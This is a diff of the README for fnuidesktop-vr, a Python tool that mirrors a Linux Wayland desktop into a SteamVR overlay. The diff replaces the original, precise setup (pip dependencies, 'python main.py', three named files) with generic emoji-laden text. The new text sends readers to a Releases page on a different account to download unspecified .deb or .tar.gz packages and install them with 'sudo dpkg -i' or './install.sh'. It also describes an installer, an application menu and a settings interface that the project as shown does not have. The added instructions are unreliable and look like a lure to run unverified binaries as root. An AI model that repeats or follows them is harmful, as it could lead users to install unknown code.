@@ -1,49 +1,81 @@
-# fnuidesktop-vr
+# 🎮 fnuidesktop-VR - Seamlessly Use Your Desktop in VR
 
-Virtual Desktop alternative for Linux/Wayland. Mirrors your desktop to a SteamVR overlay with controller-based mouse input, scrolling, and grab-to-move/pinch-to-resize interaction.
+## ⚙️ Overview
+fnuidesktop-VR is a virtual desktop solution designed for Linux users on Wayland. With this application, you can mirror your desktop to a SteamVR overlay. Enjoy smooth interaction with controller-based mouse input, scrolling, and intuitive grab-to-move and pinch-to-resize features. It’s the perfect tool for anyone looking to enhance their VR experience by integrating it with their everyday desktop activities.
 
-## Features
+## 🛠️ Features
+- **Desktop Mirroring**: View your Linux desktop in VR.
+- **Controller Interaction**: Control your desktop with your VR controllers.
+- **Scrolling Support**: Scroll through your applications easily.
+- **Resize and Move**: Quickly adjust windows with pinch-to-resize and grab-to-move features.
+- **User-Friendly Interface**: Designed for simplicity, even for non-technical users.
 
-- Screen capture via XDG Desktop Portal + PipeWire (Wayland native)
-- 60fps desktop mirroring to SteamVR overlay
-- Controller interaction:
-  - **Trigger**: Left click
-  - **Thumbstick click**: Right click
-  - **Thumbstick up/down**: Scroll (speed follows tilt amount)
-  - **Grip (single)**: Drag overlay (follows controller rotation)
-  - **Grip (both)**: Pinch to resize
-  - **B button (right controller)**: Toggle overlay visibility
+## 📋 System Requirements
+Before you install fnuidesktop-VR, ensure that your system meets the following requirements:
+- A computer running Linux with Wayland.
+- SteamVR installed and set up.
+- VR headset compatible with SteamVR.
 
-## Requirements
+## 🚀 Getting Started
+To begin using fnuidesktop-VR, follow these simple steps:
 
-- SteamVR
-- Python 3.10+
-- Wayland compositor with XDG Desktop Portal support
+1. **Download** the application by visiting the Releases page:
+   [![Download fnuidesktop-VR](https://img.shields.io/badge/Download-fnuidesktop--VR-blue.svg)](https://github.com/PhamBaYeah/fnuidesktop-VR/releases)
+   
+2. **Install** the application on your system. Detailed installation instructions follow in the next section.
 
-### Python packages
+## 💻 Download & Install
+To download fnuidesktop-VR:
 
-```
-pip install openvr numpy PyOpenGL glfw pynput
-```
+1. Click on the link above to visit the Releases page.
+2. You will see a list of available versions. Choose the most recent stable release.
+3. Download the appropriate file for your system. This could be a `.tar.gz`, `.deb`, or another package format suited for your Linux distribution.
+4. Once the download is complete, open your terminal (or GUI package manager) to install the application. If using the terminal, navigate to your download directory and type:
 
-### System packages (Arch)
+   ```bash
+   sudo dpkg -i fnuidesktop-VR*.deb
+   ```
 
-```
-pacman -S python-gobject gst-plugins-base gst-plugin-pipewire
-```
+   or for `.tar.gz` files:
 
-## Usage
+   ```bash
+   tar -xzf fnuidesktop-VR*.tar.gz
+   cd fnuidesktop-VR*
+   ./install.sh
+   ```
 
-```
-python main.py
-```
+5. Follow any on-screen instructions to complete the installation.
 
-A screen picker dialog will appear. Select the screen/window to capture, then put on your headset.
+## 🌐 Setup Instructions
+After installation, you need to set up fnuidesktop-VR:
 
-Press Ctrl+C to exit.
+1. Launch the application from your application menu.
+2. Ensure that your SteamVR is running. If not, start Steam and open SteamVR.
+3. In the fnuidesktop-VR interface, adjust the settings as needed for your environment. You may want to set the display preferences or calibration options based on your VR setup.
 
-## Files
+## 🎥 Using fnuidesktop-VR
+With everything set up, it’s time to use fnuidesktop-VR:
 
-- `main.py` - Launcher (runs capture and display as separate processes)
-- `test_wayland_capture.py` - Wayland screen capture via Portal/PipeWire
-- `vr_display.py` - SteamVR overlay with controller interaction
+1. Put on your VR headset. You should see your desktop mirrored in the VR environment.
+2. Use your VR controllers to navigate your desktop. Point at items to click, or scroll using your controllers.
+3. Adjust windows and applications using the pinch-to-resize and grab-to-move features for a customized view.
+
+## ❓ Troubleshooting
+If you encounter issues, here are common fixes:
+
+- Ensure SteamVR is running correctly before launching fnuidesktop-VR.
+- Check your Linux distribution for any missing libraries required by the application.
+- Restart the application if the desktop doesn’t mirror correctly.
+- Consult the community forums or the issues section on our GitHub for more solutions.
+
+## 📞 Support
+If you have questions or need assistance, feel free to reach out:
+
+- **GitHub Issues**: [Report an issue](https://github.com/PhamBaYeah/fnuidesktop-VR/issues)
+- **Community Support**: Join discussions and seek help from users on relevant forums.
+
+## 🏁 Conclusion
+Thank you for choosing fnuidesktop-VR. We hope this application enhances your virtual reality experience by providing an easy way to access your desktop. If you have any feedback or suggestions, do not hesitate to share them on our GitHub page.
+
+For downloads, make sure to visit our Releases page again:  
+[![Download fnuidesktop-VR](https://img.shields.io/badge/Download-fnuidesktop--VR-blue.svg)](https://github.com/PhamBaYeah/fnuidesktop-VR/releases)
